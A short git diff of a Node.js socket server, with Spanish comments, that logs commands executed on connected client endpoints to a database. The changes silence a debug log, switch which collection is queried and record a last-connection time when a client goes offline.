@@ -62,7 +62,7 @@ function startSockets() {
 		    	}else { //cuando el cliente ya tiene idpointer
 		    		socket["id"] = JSON.stringify(pData.head.id)
 		    		if (pData.body.message === "Command executed"){
-		    			console.log(pData)
+		    			//console.log(pData)
 		    			var outdata = {"endp":pData.head.id,"cmd":pData.body.command,"output":pData.body.output}
 		    			db.connect( async (err) =>{ //input a la BBDD del output del comando
 		    				var cjstring = {data: new Date(), cmd: pData.body.command, output: pData.body.output, client:pData.head.id}
@@ -95,11 +95,11 @@ function startSockets() {
 				sockets = filtered
 				console.log(typeof socket["id"])
 				db.connect( async (err) =>{
-					var cliColl = await db.getColl(collections[1])
+					var cliColl = await db.getColl(collections[0])
 					//var cliId = db.getPrimaryKey(socket["id"])
 					const ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
 					console.log("La id: ", ObjectId)
-					await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:false}}}).then((doc) =>{
+					await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:false, lastconnection: new Date()}}}).then((doc) =>{
 						var update = doc
 						console.log(doc)
 					})
